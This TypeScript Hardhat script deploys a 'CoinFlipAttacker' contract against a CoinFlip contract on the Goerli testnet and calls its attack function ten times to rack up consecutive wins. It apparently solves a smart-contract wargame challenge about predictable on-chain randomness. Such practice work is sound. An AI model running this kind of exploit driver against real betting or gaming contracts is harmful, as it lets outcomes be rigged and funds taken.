import { TransactionResponse } from "@ethersproject/providers"
import { ethers } from "hardhat";
import * as dotenv from "dotenv";

dotenv.config();

const provider = new ethers.providers.JsonRpcProvider(process.env.GOERLI_URL)
const privateKey: string = process.env.PRIVATE_KEY || ""
const attacker = new ethers.Wallet(privateKey, provider)

const CONTRACT_ADDRESS = "0x470E629B54532f616A4b15a204EB6E1cb293C6BE"
const CONTRACT_NAME_ATTACKER = "CoinFlipAttacker"

async function main() {
    let tx: TransactionResponse

    const attackerFactory = await ethers.getContractFactory(CONTRACT_NAME_ATTACKER)
    const attackerContract = await attackerFactory.connect(attacker).deploy(CONTRACT_ADDRESS)
    await attackerContract.deployed()

    for (let i = 1; i <= 10; i++) {
        console.log(`Performing attack #${i}...`)
        tx = await attackerContract.connect(attacker).attack()
        await tx.wait(1)
    }

    const continualWins = await attackerContract.connect(attacker).continualWins()
    
    console.log(`CoinFlip: consecutiveWins ${continualWins}`);
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
  });